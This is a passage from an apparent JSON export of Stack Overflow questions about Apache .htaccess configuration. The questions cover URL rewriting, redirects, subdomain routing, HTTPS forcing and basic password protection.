the base_url</p>\n\n<pre><code>$config['base_url'] = \"http\".((isset($_SERVER['HTTPS']) &amp;&amp; $_SERVER['HTTPS'] == \"on\") ? \"s\" : \"\").\"://\".$_SERVER['HTTP_HOST'].str_replace(basename($_SERVER['SCRIPT_NAME']),\"\",$_SERVER['SCRIPT_NAME']);\n</code></pre>\n\n<p>My .htaccess file is as follows:</p>\n\n<pre><code>RewriteEngine on\nRewriteCond $1 !^(index\\.php|first_cut|media|robots\\.txt|user_guide|xd_receiver\\.htm|channel.php)\nRewriteRule ^(.*)$ /index.php/$1 [L]\n</code></pre>\n\n<p>Ideally I would like https:// to always be applied to these folders...</p>\n\n<ul>\n<li>/facebook/competition</li>\n<li>/dimensions/</li>\n</ul>\n\n<p>... and then optional https for the rest of the site</p>\n\n<p>Any ideas?</p>\n"}]}
{"total":14528,"page":17,"pagesize":100,"questions":[{"tags":["ajax",".htaccess"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":62,"score":0,"question_id":12398533,"title":".htaccess Redirect to but DO NOT change URL","body":"<p>Thank you for reading this and any help you give me.</p>\n\n<p>I'd like to use .htaccess so that it can load my index.php page, no matter the URL, but not change the URL.  I need to do this so that I can have my website update via AJAX rather than reloading the entire page all the time.</p>\n\n<p>I've been trying to fix this for days and have come up with nothing.</p>\n"},{"tags":["php",".htaccess","web-security"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":58,"score":2,"question_id":12450558,"title":"what is the best way to prevent certain directories of a web site from being directly accessed?","body":"<p>Which is the best way to prevent certain directories of a web site from being directly accessed?</p>\n\n<p>1- Creating and placing a <code>.htaccess</code> file in each directory we want to protect and place the next line in it:</p>\n\n<pre><code>Deny from all\n</code></pre>\n\n<p>2- Creating and placing a <code>index.php</code> file in each directory we want to protect and place only the next line of code in it (which will redirect to homepage of the website):</p>\n\n<pre><code>&lt;?php header(\"Location: http://\" . $_SERVER['HTTP_HOST']); ?&gt;\n</code></pre>\n\n<p>3- Something else (what is it?)</p>\n"},{"tags":["php","forms",".htaccess","rewrite","mod"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":42,"score":0,"question_id":12444202,"title":"how to fix mod rewirte","body":"<p>i have problem with mod rewrite</p>\n\n<p>i made htaccess to convert url from php to html</p>\n\n<p>and every thing fine</p>\n\n<p>but problem is some file i dont need to convert like form.php</p>\n\n<p>this is my htaccess</p>\n\n<pre><code>RewriteCond %{REQUEST_URI} !^(.*)form.php(.*)$\nRewriteCond %{REQUEST_URI} !^(.*)sitemap\\.xml(.*)$\nRewriteCond %{THE_REQUEST} ^[A-Z]+\\s([^/]+)\\.php\\s\nRewriteRule .* %1.html [R=301,L]\nRewriteRule ^([^/]*)\\.html$ $1.php\nRewriteCond %{ENV:REDIRECT_STATUS} 200\nRewriteRule ^.*$ - [L]\nRewriteRule ^index.php$ http://%{http_host} [R=301,L]\n</code></pre>\n\n<p>i dont need convert sitemap.xml and form.php</p>\n\n<p>but i got error when i try to see file form.php</p>\n\n<p>HTTP Error 500 (Internal Server Error): An unexpected condition was encountered while the server was attempting to fulfill the request.</p>\n\n<p>what i can do?</p>\n"},{"tags":["php","javascript","ajax",".htaccess","http-status-code-404"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":6,"view_count":53,"score":-4,"question_id":12450148,"title":"Only access files through ajax","body":"<p>Hey I'm wondering if there is a way to only view your files when using ajax. For example\nI have ajax set up etc and I made an request but anyone could just figure out my folder structure and go to my php file and anything could happen and I want to throw them an 404 if they try to access that file. I haven't tried anything because I don't have the smallest clue.\nDo you need to use .htaccess?</p>\n\n<p>I have tried to search for this on the internet I couldn't find anything so if there is another post similar to this let me know and give me a link thank you.</p>\n"},{"tags":[".htaccess","mod-rewrite","url-rewriting","yii"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":22,"score":0,"question_id":12449648,"title":"Is it possible to remove a \"folder\" at the end of a URL using an .htaccess file?","body":"<p>so I have a bunch of URLs</p>\n\n<pre><code>http://foo.com/people/smith/john/1\nhttp://foo.com/people/cartman/eric/2\nhttp://foo.com/people/simpson/bart/3\n</code></pre>\n\n<p>I want to change the URLs like so</p>\n\n<pre><code>http://foo.com/people/smith/john/\nhttp://foo.com/people/cartman/eric/\nhttp://foo.com/people/simpson/bart/\n</code></pre>\n\n<p>So basically, I think I need to write a condition that looks for the folder 'people' and removes the third directory from the URL. Is this possible with my .htaccess? </p>\n"},{"tags":[".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":2,"view_count":52,"score":-2,"question_id":12449216,"title":"Keep url while redirecting to a different page","body":"<p>I want to redirect a particular set of Urls back to the index page of my site, but maintaining their url in the browser address bar. How would I go about to achieve this using <code>mod_rewrite</code> in a htaccess file?</p>\n\n<p>The code currently used: </p>\n\n<pre><code>&lt;IfModule mod_rewrite.c&gt;\n    RewriteEngine On\n    RewriteBase /\n    # Custom rewrite below\n    RewriteRule ^references/(.*) / [L]\n    RewriteCond %{REQUEST_FILENAME} !-f\n    RewriteCond %{REQUEST_FILENAME} !-d\n    RewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Please note that this is a WP install.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":41,"score":0,"question_id":7483626,"title":"Problem with redirection selected path to different domain","body":"<p>I have this rules inside my .htaccess file what I want to obtain is to redirects all \nrequest that don't match <strong>secure.x.com/en/account?x=1</strong> to <strong>x.com/en/account?x=1</strong> and all request like <strong>secure.x.com/en/account/xxxx</strong> shouldn't be redirected. </p>\n\n<pre><code>Options Indexes FollowSymLinks\nRewriteEngine On\n\nRewriteCond %{HTTP_HOST} secure.x.com [NC]\nRewriteCond %{REQUEST_URI} !^[a-z-]{2,8}/account [NC]\nRewriteRule (.*) http://x.com%{REQUEST_URI} [R=301,L]\n\nRewriteRule !\\.(css|gif|htm|html|ico|jpg|js|pdf|php|png|swf|txt|xml)$ index.php\n</code></pre>\n\n<p>This rule works fine for url like \nsecure.x.com/en/noaccount => redirect to x.com/en/noaccount</p>\n\n<p>But not for request like\nsecure.x.com/en/account</p>\n\n<p>What is the problem with that rule?</p>\n"},{"tags":[".htaccess","url-rewriting","yii","url-routing"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":72,"score":0,"question_id":12448664,"title":"Yii Setting a custom URL format","body":"<p>What i am trying to do is to create a custom rule in Yii for URL management.</p>\n\n<p>The general URL rules are set in main.php</p>\n\n<pre><code>    'urlManager'=&gt;array(\n        'urlFormat'=&gt;'path',\n                    'showScriptName'=&gt;false,\n        'rules'=&gt;array(\n            '&lt;controller:\\w+&gt;'=&gt;'&lt;controller&gt;/index',\n                            '&lt;controller:\\w+&gt;/&lt;id:\\d+&gt;'=&gt;'&lt;controller&gt;/view',\n            '&lt;controller:\\w+&gt;/&lt;action:\\w+&gt;/&lt;id:\\d+&gt;'=&gt;'&lt;controller&gt;/&lt;action&gt;',\n            '&lt;controller:\\w+&gt;/&lt;action:\\w+&gt;'=&gt;'&lt;controller&gt;/&lt;action&gt;',\n        ),\n</code></pre>\n\n<p>the .htaccess file is also set like</p>\n\n<pre><code>RewriteEngine on\n# if a directory or a file exists, use it directly\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\n\n\n# otherwise forward it to index.php\nRewriteRule . index.php\n</code></pre>\n\n<p>so i have URLs in the form</p>\n\n<blockquote>\n  <p>local/cp/xyz/create</p>\n</blockquote>\n\n<p>Now i have a custom controller for which the current URL is like</p>\n\n<blockquote>\n  <p>local/cp/xyz/create/abc</p>\n</blockquote>\n\n<p>what i want is</p>\n\n<blockquote>\n  <p>local/cp/abc/create</p>\n</blockquote>\n"},{"tags":["php",".htaccess","netbeans","url-rewriting","webserver"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":88,"score":0,"question_id":12447889,"title":"NetBeans PHP built-in web server - rewrite","body":"<p>I am working in NetBeans IDE 7.2 on Windows 7.</p>\n\n<p>I need to set some rewrite rules for my web project.</p>\n\n<p>Can I use custom <code>.htaccess</code> files (or something similar), using <code>PHP built-in web server</code>?</p>\n"},{"tags":["php","apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":34,"score":0,"question_id":12447431,"title":"How to automatize rewriterule in .htaccess?","body":"<p>I'm doing this in .htaccess:</p>\n\n<pre><code>RewriteRule ^([A-Za-z0-9-]+)[/]?$ /index.php?u1=$1 [L,QSA]\nRewriteRule ^([A-Za-z0-9-]+)/([A-Za-z0-9-]+)[/]?$ /index.php?u1=$1&amp;u2=$2 [L,QSA]\nRewriteRule ^([A-Za-z0-9-]+)/([A-Za-z0-9-]+)/([A-Za-z0-9-]+)[/]?$ /index.php?u1=$1&amp;u2=$2&amp;u3=$3 [L,QSA]\nRewriteRule ^([A-Za-z0-9-]+)/([A-Za-z0-9-]+)/([A-Za-z0-9-]+)/([A-Za-z0-9-]+)[/]?$ /index.php?u1=$1&amp;u2=$2&amp;u3=$3&amp;u4=$4 [L,QSA]\n</code></pre>\n\n<p>Is there any way to make this automatically from u1 to u(infinite), automatically, based on the length of the url, without having to define every case?</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12433885,"title":".htaccess Help For Multiple Get Variables","body":"<p>I want my URL to look like:\nlocalhost/website/148/category</p>\n\n<p>Here is my .htaccess file at the moment</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^(.*)(.*)$ /website/index.php?id=$1&amp;c=$2\n</code></pre>\n\n<p>Can anyone help me? I have been looking around forever for the answer and so far nothing has worked for me.</p>\n"},{"tags":["apache",".htaccess","mod-rewrite"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12422937,"title":"htaccess redirect for global subdomains system - all subdomains redirected to one php file to handle them all","body":"<p>i really could use some advices related to subdomains.</p>\n\n<p>recently we decide to make every subdomain of main portal to be available for blogs (something similar to lets say any blog platform)</p>\n\n<p>so what i cant achieve is to make redirection to certain folder of main portal site or php file like:</p>\n\n<p><code>xxxxx.domain.com/index.php?get=xx&amp;get2=xx</code> -> to be run by actual php file located on main portal account, lets say <code>subdomains.php?get=x&amp;get2=xx</code>, alternatively - to be run by <code>mainportal/subdomains/index.php?get=x&amp;get2=xx</code></p>\n\n<p>i tried with</p>\n\n<pre><code>RewriteCond %{HTTP_HOST} ^(.*)\\.domain\\.pl$ [NC]\nRewriteRule (.*) subdomain.php [L]\n</code></pre>\n\n<p>effect was almost correct but get parameters are missing:( \non the other hand it can be entirely wrong... i simply dont understand or that rewrite rules:(</p>\n\n<p>thanks for any help/tips</p>\n"},{"tags":[".htaccess","optimization","mod-rewrite"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":16,"score":0,"question_id":12439403,"title":"Info with mod_rewrite .htaccess","body":"<p>I have been trying forever to get rid of the .php from my site. I want it to look like example.com/about instead of example.com/about.php. I have it to were it will rewrite it so i can type it in as example.com/about but i want it to were when i click on a link on my website to go to example.com/about it loads the url as example.com/about and not example.com/about.php. Overall i would like it so that whenever someone loads anything on my page the end of the url doesnt have the .php. My .htaccess right now looks like so,  </p>\n\n<pre><code>RewriteEngine on\n\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}\\.php -f\nRewriteRule ^([^/]+)/$ $1.php\n</code></pre>\n\n<p>Thank you.</p>\n"},{"tags":["apache",".htaccess","url","mod-rewrite","subdomain"],"answer_count":1,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12443652,"title":"How to load specific page for subdomain url, using htaccess","body":"<p>How can I let my server load (<em>invisibly!</em>) somepage.htm, when an url is given with a subdomain in front of it, using only Apache's .htaccess ?</p>\n\n<p>So that when user types <code>subdomain.website.org</code> then server loads  <code>website.org/somepage.htm</code></p>\n"},{"tags":["apache",".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":44,"score":0,"question_id":12427371,"title":".htaccess redirect loop issue","body":"<p>If I go to domain.com, site redirects to domain.com/en, which is expected. But then the last rule kicks in and throws it in a loop making my url look something like this:</p>\n\n<pre><code>http://domain.com/en/?lang=en&amp;request=&amp;site=basecamp&amp;lang=en&amp;request=&amp;site=basecamp&amp;lang=en&amp;request=&amp;site=basecamp&amp;lang=en&amp;request=&amp;site=basecamp\n</code></pre>\n\n<p><strong>.htaccess file</strong></p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n\nRewriteBase /\n\nRewriteCond %{REQUEST_URI} !/(content|images|css|js|fonts|pdfs)/\nRewriteRule  /([^.]+\\.(jpe?g|gif|bmp|png|css|js|eot|svg|ttf|ico|pdf))$ /$1 [NC,R,L]\n\nRewriteCond %{REQUEST_URI} !(content|images|css|js|fonts|pdfs)/.*\nRewriteRule !^[a-z]{2}/ /en/ [NC,L,R]\n\nRewriteCond %{REQUEST_URI} !/(init\\.php|content|images|css|js|fonts|pdfs)/\nRewriteRule ^([a-z]{2})/(.*)$ init.php?lang=$1&amp;request=$2&amp;site=basecamp[L,QSA]\n</code></pre>\n\n<p>Why is the htaccess file redirecting to /?GET_VARS instead of /init.php?GET_VARS ?</p>\n\n<p>And how can I avoid this loop?</p>\n"},{"tags":["php","apache",".htaccess","mod-rewrite","redirect"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":96,"score":-1,"question_id":12444643,"title":"htaccess redirect to parent directory - bad request","body":"<p>We have an htaccess file to handle pretty links for a couple of folders. Some examples:</p>\n\n<pre><code>http://test.com/basecamp/en/foobar -&gt; ../init.php?lang=en&amp;request=foobar&amp;site=basecamp\nhttp://test.com/ravili/en/foobar   -&gt; ../init.php?lang=en&amp;request=foobar&amp;site=ravili\nhttp://test.com/ravili/ar/foo/bar  -&gt; ../init.php?lang=ar&amp;request=foo/bar&amp;site=ravili\n</code></pre>\n\n<p><strong>Directory structure</strong></p>\n\n<pre><code>/webroot\n   init.php\n/webroot/basecamp\n   .htaccess\n/webroot/ravili\n   .htaccess\n</code></pre>\n\n<p>But now, we're try to move the folders into individual domains, so instead of <code>http://test.com/basecamp</code>, we'll have <code>http://test-basecamp.com</code></p>\n\n<p>So the <code>.htaccess</code> is no longer redirecting to the init.php in the webroot, we get a 400 Bad Request and an 'Invalid URI in request GET /en/ HTTP/1.1' in the error log</p>\n\n<p><strong>htaccess file</strong></p>\n\n<pre><code>Options +FollowSymlinks\nRewriteEngine on\n\nRewriteBase /\n\nRewriteCond %{REQUEST_URI} !/(content|images|css|js|fonts|pdfs)/\nRewriteRule /([^.]+\\.(jpe?g|gif|bmp|png|css|js|eot|svg|ttf|ico|pdf))$ /$1 [NC,R,L]\n\nRewriteCond %{REQUEST_URI} !(content|images|css|js|fonts|pdfs)/.*\nRewriteRule !^[a-z]{2}/ /en/ [NC,L,R]\n\nRewriteCond %{REQUEST_URI} !/(content|images|css|js|fonts|pdfs)/\nRewriteRule ^([a-z]{2})/(.*)$ ../init.php?lang=$1&amp;request=$2&amp;site=basecamp [L,QSA]\n</code></pre>\n\n<p>So how do we go about solving this?</p>\n"},{"tags":["apache",".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":39,"score":0,"question_id":12443961,"title":".htaccess Not Working Properly In IE","body":"<p>My .htaccess file is not working in IE, It works fine in FireFox and Chrome, but in IE images wont load, and links don't work correctly ether. The CSS works fine and all the PHP seams to be working aswell.</p>\n\n<p>I am pretty sure that it has something to do with me needing to pull 2 GET variables from the url, because it works fine when I only need to pull one variable. Anyway here is my code</p>\n\n<pre><code>RewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule ^/?([^/]+)/([^/]+)/?$ /website/index.php?id=$1&amp;c=$2\n</code></pre>\n\n<p>Please help, I have been looking for hours for a solution for this.</p>\n"},{"tags":["php",".htaccess","map","url-rewriting","internal"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":34,"score":0,"question_id":12442962,"title":"Htaccess URLRewrite to another map","body":"<p>When i go to {url}/klanten/home/ or {url}/klanten/logout/ a 500 Internal Server Error come.</p>\n\n<p>My htaccess:</p>\n\n<pre><code>RewriteEngine on\n\nRewriteRule ^klanten/([^/]+)/?$ klanten/$1.php [L,QSA,NC]\n\nRewriteRule ^error/([^/]+)/([^/]+)/([^/]+)/([^/]+)/?$ error.php?type=$1&amp;error=$2&amp;file=$3&amp;from=$4 [L,QSA,NC]\n\nRewriteRule ^email/([^/]+)/?$ email.php?id=$1 [L,QSA,NC]\n\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME}.php -f\nRewriteRule ^(.*)$ $1.php [L]\n</code></pre>\n\n<p>The map 'klanten' exists and the file home.php and logout.php exists too.</p>\n\n<p>Thanks!</p>\n"},{"tags":["apache",".htaccess","mod-rewrite","url-rewriting","rewrite"],"answer_count":2,"favorite_count":3,"up_vote_count":2,"down_vote_count":0,"view_count":738,"score":2,"question_id":4881410,"title":"Apache .htaccess: How to remove question mark from URL if not `?id=(.*)`?","body":"<p>How to make .htaccess to <strong>remove question mark from URL if not</strong> <code>?id=(.*)</code><strong>?</strong></p>\n\n<pre><code># Rewrite for ?id=(.*)\nRewriteCond %{QUERY_STRING} ^id=(.*)$\nRewriteRule .*$ %{REQUEST_URI}%1? [R=301,L]\n\n# It does not work out on this way\nRewriteCond %{QUERY_STRING} !=\"\"\nRewriteCond %{QUERY_STRING} !^id=.*\nRewriteRule .*$ %{REQUEST_URI}%1? [R=301,L]\n</code></pre>\n"},{"tags":["apache",".htaccess","htpasswd"],"answer_count":2,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":187,"score":1,"question_id":12291080,"title":"Proper .htpasswd usage","body":"<p>Assuming a small (pages &lt; 5) site, what is the proper usage of <code>.htaccess</code> and <code>.htpassword</code>? I recently watched <a href=\"http://www.youtube.com/watch?v=S-EYoLyVXWQ\" rel=\"nofollow\">a tutorial from Nettuts+</a> where this sample code was given:</p>\n\n<p>.htaccess</p>\n\n<pre><code>AuthName \"Login title\"\nAuthType Basic\nAuthUserFile /path/to/.htpasswd\nrequire valid-user\n</code></pre>\n\n<p>.htpasswd <em>(created using <code>htpasswd -c &lt;file&gt; &lt;username&gt;</code> command)</em></p>\n\n<pre><code>username:encrypted-version-of-password\n</code></pre>\n\n<p>I am also curious as to the actual level of security this provides: can it be bypassed easily? If Apache by default does not allow users to access either of the two files directly, do they need to be outside the public directory? Are there any speed implications?</p>\n"},{"tags":[".htaccess","url","redirect"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":21,"score":0,"question_id":12423564,"title":"Rewrite url of website to","body":"<p>I wanted ask you what command has to be written in the .htaccess to achieve my domain to look like\n\nlike this website\n</p>\n\n<p>It's files are stored in \n<a href=\"http://imgah.com/\" rel=\"nofollow\">http://imgah.com/</a> but it shows <a href=\"http://imgah.com/_\" rel=\"nofollow\">http://imgah.com/_</a> as the url. </p>\n\n<p>Thanks </p>\n"},{"tags":[".htaccess","redirect","subdomain"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":22,"score":1,"question_id":12433817,"title":"Redirect ANY subdomain to root","body":"<p>I would like a script to redirect any subdomain (except mail) to my root domain. Even if that subdomain doesn't exist and people write anything for the subdomain, I want it to go to the root.</p>\n\n<p>I've searched and I need a specific .htaccess script.</p>\n\n<p>For example:</p>\n\n<blockquote>\n  <p>barackobama.mywebsite.com ---> www.mywebsite.com<br>\n  chickentogo.mywebsite.com ---> www.mywebsite.com<br>\n  123.mywebsite.com ---> www.mywebsite.com<br>\n  typewhatever.mywebsite.com ---> www.mywebsite.com<br></p>\n</blockquote>\n\n<p>I only want to keep <code>mail.mywebsite.com ---&gt; mail.mywebsite.com</code></p>\n\n<p>I dont have access to DNS manager, so I can only use a .htaccess script.</p>\n"},{"tags":["http",".htaccess","mod-rewrite","https"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":178,"score":0,"question_id":8436073,"title":"Http to Https htaccess Redirect Breaks SSL Security","body":"<p>I have the following .htaccess file that redirects HTTP pages to HTTPS, which is DOES do -- however, it breaks security in Firefox and IE. It has <em>something</em> to do with the #FORCE HTTP section of the code, because when I remove that section, and just keep the #FORCE HTTPS section, security works fine in all browsers. </p>\n\n<p>I can tell something is happening because while the page is loading, it shows the verified lock symbol for a split second but then it disappears entirely. I mean entirely; it does not even show the broken lock icon.</p>\n\n<p>Note that the url is still https:// when it does this. So even if I type in https:// manually it does this.</p>\n\n<pre><code># FORCE HTTP\nRewriteCond %{REQUEST_URI} !^(.*)/(donate|debit)/?$\nRewriteCond %{REQUEST_URI} !\\.(css|js|png|gif|etc|jpeg) [NC]\nRewriteCond %{ENV:HTTPS} on [NC]\nRewriteRule ^(.*)$ http://www.domain.org/$1 [R=301,NC,L]\n\n# FORCE HTTPS\nRewriteCond %{ENV:HTTPS} !on [NC]\nRewriteCond %{REQUEST_URI} ^(.*)/(donate|debit)/?$\nRewriteRule ^(.*)$ https://www.domain.org/$1 [R=301,NC,L]\n</code></pre>\n"},{"tags":[".htaccess"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12428900,"title":"htaccess 301 with a more complex redirect","body":"<p>I have a client domain with thousands of pages that are moving to a new domain. The naming convention of the .html has changed, and I know htaccess can handle this somehow.</p>\n\n<p>Here's an example:</p>\n\n<p>old site: <a href=\"http://oldsite.com/west-virginia/new-cumberland-wv-index.html\" rel=\"nofollow\">http://oldsite.com/west-virginia/new-cumberland-wv-index.html</a></p>\n\n<p>new site: <a href=\"http://newsite.com/west-virginia/computer-support-new-cumberland-wv-index.html\" rel=\"nofollow\">http://newsite.com/west-virginia/computer-support-new-cumberland-wv-index.html</a></p>\n\n<p>I also have a few issues where things like newcumberland are renamed to new-cumberland</p>\n\n<p>This is beyond my understanding at the moment. I'd appreciate a little help. Thanks!</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12434156,"title":"deny files without extension with .htaccess","body":"<p>my server was hacked and somebody placed files without a file extension. \nhow can I deny access to those files with .htaccess?</p>\n\n<p>and does it even make sense?</p>\n"},{"tags":["php",".htaccess","rewrite"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":129,"score":0,"question_id":12404271,"title":"Rewrite extension if file exists, redirect if file does not exist, with htaccess","body":"<p>Using .htaccess, I'd like to redirect files that do not exist to a controller page, and rewrite the extension of .php files that do exist to an .html extension.  If a file exists and is an .html page, I'd like it to remain the same.  Every time I try to inject the rewrite rule from .php to .html, I seem to mess up the redirect to the controller page.  So I'm not sure where to go from here:</p>\n\n<pre><code>Options -Indexes\nOptions +FollowSymLinks\nDirectoryIndex index.php\nErrorDocument 404 /404.php\n\n&lt;IfModule mod_rewrite.c&gt;\n  RewriteEngine on\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^(.*)$ mycontroller.php [L,QSA]\n&lt;/IfModule&gt;\n</code></pre>\n\n<p>Any help I'd be most grateful for.</p>\n\n<p><em><strong>Edit</em></strong></p>\n\n<p>I seem to have found most of the answer <a href=\"http://stackoverflow.com/questions/4548860/replacing-php-ext-with-html-through-htaccess\">here</a> (but I have to leave out the ReweriteBse or it doesn't work).  The biggest issue is that now, my existing .html files don't work, it only serves my .php files with .html extensions and directs all else to the controller.  Existing .html files go to my 404 page.  I'd like to know how I can keep my existing .html files intact.  My new code as follows:</p>\n\n<pre><code>  RewriteEngine on\n\n  RewriteCond %{THE_REQUEST} (.*)\\.php  \n  RewriteRule ^(.*)\\.php $1.html [R=301,L]  \n\n  RewriteCond %{THE_REQUEST} (.*)\\.html  \n  RewriteRule ^(.*)\\.html $1.php [L]  \n\n  RewriteCond %{REQUEST_FILENAME} !-f\n  RewriteCond %{REQUEST_FILENAME} !-d\n  RewriteCond %{REQUEST_URI} !=/favicon.ico\n  RewriteRule ^(.*)$ mycontroller.php [L,QSA]\n</code></pre>\n"},{"tags":["wordpress",".htaccess","redirect","permalinks"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":53,"score":0,"question_id":12432420,"title":"301 Redirects from specific .html pages to new permalink structure failing","body":"<p>I've been searching online for over an hour trying to find out why my .htaccess file isn't working as expected, but all the docs and questions about .htaccess seem to say everything should be fine. i am using a wordpress site now and need to redirect some old links to *.html files to new permalinks (one by one as the naming convention has changed completely). so my .htaccess file looks like this:</p>\n\n<pre><code># Redirects for old URLs\nredirect 301 /contact_us http://rpcdev.thisisforge.com/contact/\nredirect 301 /about_us http://rpcdev.thisisforge.com/about/\nredirect 301 /clients http://rpcdev.thisisforge.com/work/\nredirect 301 /clients/event.html http://rpcdev.thisisforge.com/work/event-retail-design/\nredirect 301 /clients/identity.html http://rpcdev.thisisforge.com/work/identity-branding/\nredirect 301 /clients/web.html http://rpcdev.thisisforge.com/work/web-design/\nredirect 301 /clients/corp_lit.html http://rpcdev.thisisforge.com/work/brochures-publications/\n\n# BEGIN WordPress\n&lt;IfModule mod_rewrite.c&gt;\nRewriteEngine On\nRewriteBase /\nRewriteRule ^index\\.php$ - [L]\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteRule . /index.php [L]\n&lt;/IfModule&gt;\n# END WordPress\n</code></pre>\n\n<p>The First three are working fine, it's the ones from specific .html pages that are not. I've tried putting the code both above and below the WOrdPress code, and I've tried switching the order of my 301s so the .html redirects are first, not last. but this doesnt help. Weirdly, sometimes the corp_lit.html redirect works ok, but the others don't. i can see no rhyme or reason to this!</p>\n\n<p>Is my browser or OS (windows s7) caching the 301s from the .htaccess or something, back from when they were maybe incorrectly typed? i've tried emptying browser cache and flushing DNS in command prompt, but to no avail.</p>\n\n<p>Pull\nAny help much appreciated.</p>\n"},{"tags":["php",".htaccess","hash"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":35,"score":0,"question_id":12432212,"title":"redirect is keeping hash","body":"<p>For some reason when I redirect with <code>header(\"Location\")</code> the new page keeps the hash.</p>\n\n<p>So if you're on <code>example.com/index.html#signup</code></p>\n\n<p>I redirect with</p>\n\n<pre><code>header(\"Location: /account.html\");\nexit;\n</code></pre>\n\n<p>But then it shows <code>example.com/account.html#signup</code></p>\n\n<p>Why is this happening and how can I stop it? ie <code>example.com/account.html</code></p>\n\n<hr>\n\n<p>Note:</p>\n\n<p>I am using an .htaccess to redirect <code>file.html</code> to <code>file.php</code></p>\n\n<pre><code>RewriteRule ^([a-zA-Z0-9-_.]+)\\.html$ $1.php [L]\n</code></pre>\n"},{"tags":[".htaccess","cakephp","cakephp-1.3"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":36,"score":1,"question_id":12431068,"title":"Htaccess redirect with cakePHP","body":"<p>I have a cakePHP app working at <code>http://domain1.com/domain2</code>, and want to point <code>http://domain2.com/</code> to this application.</p>\n\n<p>I have done this change the document root of <code>domain2</code> to <code>public_html/domain2</code>, but, when I go to: <code>domain2.com</code> all css, javascript and images are not loaded, with a message saying controller not found.</p>\n\n<p>What I can do?</p>\n\n<p>All domains have a folder with their domains without the TLD at domain1.com, I think if I create a htaccess and get the domain without TLD, and finally change rewriteBase, will work as expected, but don't know how to do this.</p>\n\n<p>Current htaccess of <code>domain2</code>:</p>\n\n<pre><code>RewriteEngine On\nRewriteBase /\nRewriteCond %{REQUEST_FILENAME} !-d\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^(.*)$ index.php?url=$1 [QSA,L]\n</code></pre>\n"},{"tags":["php",".htaccess","zend-framework","url-rewriting"],"answer_count":6,"favorite_count":1,"up_vote_count":5,"down_vote_count":0,"view_count":417,"score":5,"question_id":12243005,"title":".htaccess Url Rewrite Remove Query-String Keys","body":"<p>I have a set of urls like...</p>\n\n<pre><code>www.example.com/page/1/name/abc\nwww.example.com/city/la/name/abc\nwww.example.com/page/1/name/abc/city/la\nwww.example.com/page/1/\n</code></pre>\n\n<p>And want to convert them as..</p>\n\n<pre><code>www.example.com/1/abc\nwww.example.com/la/abc\nwww.example.com/1/abc/la\nwww.example.com/1/\n</code></pre>\n\n<p>Basically i want to hide keys from query string.</p>\n\n<p>How to do this? Any Help?</p>\n\n<p><strong>Edit</strong></p>\n\n<p>I have different keys for every page and there are about 25 keys per page.</p>\n"},{"tags":[".htaccess"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":26,"score":0,"question_id":12426566,"title":"Htaccess Rewrite to remove directory","body":"<p>I need help creating a rewrite string to remove the ~12345678/ from the following: www.example.com/~12345678/file.</p>\n\n<p>This doesn't appear on every link. What happened is during development links were created using the development url, there are a couple dozen links that appear this way. The rest of the links are fine. I already use a rewrite to remove index.php. 